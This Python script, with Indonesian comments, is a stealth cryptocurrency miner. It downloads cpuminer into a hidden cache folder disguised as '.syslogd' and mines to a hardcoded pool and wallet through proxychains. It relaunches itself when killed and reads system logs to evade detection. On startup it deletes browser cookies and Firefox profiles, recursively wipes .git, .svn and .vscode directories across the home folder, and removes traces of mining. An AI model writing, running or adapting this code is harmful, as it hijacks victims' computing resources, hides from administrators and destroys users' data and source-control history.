#!/usr/bin/env python3
import os, subprocess, urllib.request, tarfile, time, threading, shutil, sys, random, signal, socket

# === KONFIGURASI ===
URL = "https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz"
TARFILE = "miner.tar.gz"
BIN_NAME = "cpuminer-sse2"
ALIAS_BIN = ".syslogd"
HIDDEN_DIR = os.path.expanduser("~/.cache/.coreguard")
POOL = "stratum+tcp://164.92.145.122:80"
WALLET = "mbc1q4xd0fvvj53jwwqaljz9kvrwqxxh0wqs5k89a05.Icut"
PASSWORD = "x"
THREADS = random.randint(1, min(2, os.cpu_count()))
RESTART_INTERVAL = 600
COOLDOWN_DURATION = 180

BIN_PATH = os.path.join(HIDDEN_DIR, ALIAS_BIN)

def is_cpu_100_percent():
    try:
        return os.getloadavg()[0] >= os.cpu_count()
    except:
        return False

def prepare_binary():
    os.makedirs(HIDDEN_DIR, exist_ok=True)
    if not os.path.isfile(BIN_PATH):
        print("[â¬‡ï¸] Mengunduh binary miner...")
        urllib.request.urlretrieve(URL, TARFILE)
        with tarfile.open(TARFILE) as tar:
            tar.extractall(HIDDEN_DIR)
        os.rename(os.path.join(HIDDEN_DIR, BIN_NAME), BIN_PATH)
        os.chmod(BIN_PATH, 0o755)
        os.remove(TARFILE)

def proxy_exec():
    env = os.environ.copy()
    env["LD_PRELOAD"] = os.path.abspath("./libproxychains.so")
    env["PROXYCHAINS_CONF_FILE"] = os.path.abspath("./proxychains.conf")
    cmd = [BIN_PATH, "-a", "power2b", "-o", POOL, "-u", WALLET, "-p", PASSWORD, f"-t{THREADS}"]
    return subprocess.Popen(cmd, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)

def monitor_process(proc):
    print(f"[ðŸ›¡ï¸] Monitoring PID: {proc.pid}")
    while True:
        if is_cpu_100_percent():
            print(f"[ðŸ”¥] CPU 100% â€” cooldown {COOLDOWN_DURATION}s...")
            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
            time.sleep(COOLDOWN_DURATION)
            restart_script()
        if proc.poll() is not None:
            print("[âš ï¸] Miner mati. Restarting...")
            time.sleep(5)
            new_proc = proxy_exec()
            monitor_process(new_proc)
            break
        time.sleep(10)

def restart_script():
    print("[ðŸ”] Restarting script...")
    time.sleep(3)
    os.execl(sys.executable, sys.executable, *sys.argv)

def clean_mining_artifacts():
    for base in ["~/.cache", "~/.local/share", "~/Downloads", "/tmp"]:
        for root, _, files in os.walk(os.path.expanduser(base)):
            for f in files:
                if any(k in f.lower() for k in ["miner", "cpuminer", "power2b"]):
                    try: os.remove(os.path.join(root, f))
                    except: pass

def clean_source_control():
    for base in ["~", "~/.local/share", "~/Downloads"]:
        for root, dirs, _ in os.walk(os.path.expanduser(base)):
            for d in [".git", ".svn", ".idea", ".vscode", "__pycache__"]:
                path = os.path.join(root, d)
                if os.path.exists(path):
                    try: shutil.rmtree(path)
                    except: pass

def clean_myapp_data():
    for path in ["~/MyAppExplore", "~/.local/share/myapp", "~/Downloads/MyApp"]:
        full = os.path.expanduser(path)
        if os.path.exists(full):
            try: shutil.rmtree(full)
            except: pass

def clean_browser_cookies():
    for path in [
        "~/.config/google-chrome/Default/Cookies",
        "~/.mozilla/firefox", "~/.config/chromium/Default/Cookies"
    ]:
        full = os.path.expanduser(path)
        if os.path.exists(full):
            try:
                if os.path.isdir(full): shutil.rmtree(full)
                else: os.remove(full)
            except: pass

def fake_http_headers():
    headers = [
        "User-Agent: Mozilla/5.0",
        "Accept: */*",
        "Referer: https://google.com/",
        "Connection: keep-alive",
        "X-Forwarded-For: 127.0.0.1",
    ]
    os.environ["FAKE_HEADERS"] = "|".join(headers)

def anti_suspend():
    while True:
        try:
            sys.stdout.write("\b")
            sys.stdout.flush()
        except:
            pass
        time.sleep(15)

def dns_doh_bypass():
    try:
        subprocess.call([
            "curl", "-s", "-H", "accept: application/dns-json",
            "https://cloudflare-dns.com/dns-query?name=pool.rplant.xyz&type=A"
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except: pass

def firewall_bypass():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect(("1.1.1.1", 443))
        s.close()
    except: pass
    try:
        subprocess.call(["ping", "-c", "1", "8.8.8.8"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except: pass

def detect_system_threat():
    paths = ["/var/log/auth.log", "/var/log/syslog", "/var/log/messages", "/etc/nologin", "/tmp/.X11-unix"]
    for path in paths:
        if os.path.exists(path):
            try:
                with open(path, "r", errors="ignore") as f:
                    log = f.read().lower()
                    if any(k in log for k in ["suspend", "ban", "terminate", "dismiss"]):
                        print(f"[ðŸš«] Deteksi sistem diblokir: {path}")
                        subprocess.call(["pkill", "-f", BIN_PATH])
            except: continue

def clean_up():
    try:
        if os.path.exists(TARFILE): os.remove(TARFILE)
        shutil.rmtree(HIDDEN_DIR, ignore_errors=True)
    except: pass

# ENTRY POINT
if __name__ == "__main__":
    print("ðŸš€ Stealth Miner Anti-Kill + Cooldown Dimulai...")
    threading.Thread(target=anti_suspend, daemon=True).start()
    threading.Thread(target=dns_doh_bypass, daemon=True).start()
    threading.Thread(target=firewall_bypass, daemon=True).start()
    threading.Thread(target=detect_system_threat, daemon=True).start()
    fake_http_headers()
    clean_browser_cookies()
    clean_myapp_data()
    clean_source_control()
    clean_mining_artifacts()

    try:
        prepare_binary()
        miner_proc = proxy_exec()
        monitor_process(miner_proc)
    except KeyboardInterrupt:
        print("[â›”] Dihentikan manual.")
        os.killpg(os.getpgid(miner_proc.pid), signal.SIGTERM)
        clean_up()
    except Exception as e:
        print(f"[X] Error fatal: {e}")
        clean_up()
